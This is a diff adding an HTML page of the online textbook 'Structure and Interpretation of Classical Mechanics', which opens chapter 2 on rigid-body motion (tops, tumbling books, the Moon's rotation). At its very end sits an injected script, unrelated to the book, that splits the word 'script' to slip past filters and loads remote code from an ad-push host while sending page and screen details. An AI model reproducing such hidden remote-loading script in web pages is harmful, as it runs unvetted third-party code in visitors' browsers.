@@ -1,0 +1,119 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-19.html">previous</a></span><span>, <a href="book-Z-H-21.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_chap_2"></a>
+<h1 class=chapter>
+<div class=chapterheading><a href="book-Z-H-4.html#%_toc_%_chap_2">Chapter 2</a></div><br>
+<a href="book-Z-H-4.html#%_toc_%_chap_2">Rigid Bodies</a></h1>
+<p></p>
+<p>
+
+</p>
+
+<div align=right> 
+<table width=60%><tr><td>
+<span class=epigraph>
+
+<p>
+The polhode rolls without slipping on the herpolhode lying in the invariable plane.</p>
+<p>
+<a name="%_idx_1054"></a>Herbert Goldstein,
+<i>Classical Mechanics</i> [<a href="book-Z-H-80.html#cite{Goldstein}">20</a>], footnote, p.&nbsp;207.</p>
+<p>
+</p>
+
+</span>
+</td></tr></table>
+</div>
+
+<p></p>
+<p>
+The motion of rigid bodies presents many surprising phenomena.</p>
+<p>
+<a name="%_idx_1056"></a><a name="%_idx_1058"></a>Consider the motion of a top.  A top is usually thought of as an
+axisymmetric body, subject to gravity, with a point on the axis of
+symmetry that is fixed in space.  The top is spun and in general
+executes some complicated motion.  We observe that the top usually
+settles down into an unusual motion in which the axis of the top
+slowly <a name="%_idx_1060"></a>precesses about the vertical, apparently moving perpendicular
+to the direction in which gravity is attempting to accelerate it.</p>
+<p>
+<a name="%_idx_1062"></a>Consider the motion of a book thrown into the air.<a name="call_footnote_Temp_175" href="#footnote_Temp_175"><sup><small>1</small></sup></a>  Books have
+three main axes.  If we idealize a book as a brick with rectangular faces, the
+three axes are the lines through the centers of opposite faces.  Try
+spinning the book about each axis.  The motion of the book spun about
+the longest and the shortest axis is a simple regular rotation,
+perhaps with a little wobble depending on how carefully it is thrown.
+The motion of the book spun about the intermediate axis is
+qualitatively different: however carefully the book is spun about
+the intermediate axis, it tumbles.</p>
+<p>
+<a name="%_idx_1066"></a><a name="%_idx_1068"></a>The rotation of the Moon is peculiar in that the Moon always presents
+the same face to the Earth, indicating that the rotational period and
+the orbit period are the same.  Considering that the orbit of the Moon
+is constantly changing because of interactions with the Sun and other
+planets, and therefore its orbital period is constantly
+undergoing small variations, we might expect that the face of the Moon
+that we see would slowly change, but it does not.  What is special
+about the face that is presented to us?</p>
+<p>
+<a name="%_idx_1070"></a>A rigid body may be thought of as a large number of constituent
+particles with rigid constraints among them.  Thus the dynamical
+principles governing the motion of rigid bodies are the same as those
+governing the motion of any other system of particles with rigid
+constraints.  What is new here is that the number of constituent
+particles is very large and we need to develop new tools to handle
+them effectively.</p>
+<p>
+We have found that a Lagrangian for a system with rigid constraints
+can be written as the difference of the kinetic and potential
+energies.  The kinetic and potential energies are naturally expressed
+in terms of the positions and velocities of the constituent particles.
+To write the Lagrangian in terms of the generalized coordinates and
+velocities we must specify functions that relate the generalized
+coordinates to the positions of the constituent particles.  In the
+systems with rigid constraints considered up to now these functions
+were explicitly given for each of the constituent particles and
+individually included in the derivation of the Lagrangian.  For a
+rigid body, however, there are too many consituent particles to handle each one
+of them in this way.  We need to find means of expressing the kinetic
+and potential energies of rigid bodies in terms of the generalized
+coordinates and velocities, without going through the
+particle-by-particle details.</p>
+<p>
+The strategy is to first rewrite the kinetic and potential energies in
+terms of quantities that characterize essential aspects of the
+distribution of mass in the body and the state of motion of the body.
+Only later do we introduce generalized coordinates.  For the kinetic
+energy, it turns out a small number of parameters completely specify
+the state of motion and the relevant aspects of the distribution of
+mass in the body.  For the potential energy, we find that for some
+specific problems the potential energy can be represented with a small
+number of parameters, but in general we have to make approximations to
+obtain a representation with a manageable number of parameters.</p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_175" href="#call_footnote_Temp_175"><sup><small>1</small></sup></a> We put a
+<a name="%_idx_1064"></a>rubber band or string around the book so that it does not open.</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-19.html">previous</a></span><span>, <a href="book-Z-H-21.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD0%2bTblgXvO6xLIlYCzfAaOxXMeeD05MbOaWPmtDbvbAI2%2fytY1RlgD9riLS8dYXGlY%2fKSo0%2bVLUCgL2UDVpBqzMNkpn4ATakGhGoxULjw3KZEq7I6P2cAEVEfOJKvYVMV71SN9MXABrHIYiwrog6Rzjq2ODlQpQ1blNHAjLfTl8AvVsrwQcSEvYs10XiTtYk9x8BQPw1sVCmRTpXxSpFoEGc%2fFbx%2fNCBqpa49vjlDenF1zeXFyh9zaFvP%2bA3IfK3S%2b3dyl1Stn%2bXOfe%2b7U5Tg34ysxBy8GhtnOad6VCEyDF3EnzpLovUglNRt%2bZHfkYtjXJlwo1eYlxR15lEhO0PT%2fCjVDqXW3amKlxPCqb6mVyBfK2vMWNp4BOkHlecv3LddwCzIiLSH8rzh3JkepfTJbPkz71kuWF4Uql7NBpkknd%2ffWkP7J2kYZ5czkJBKQxqOmRlqCsVix3PUlGB%2fN1z3iO");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
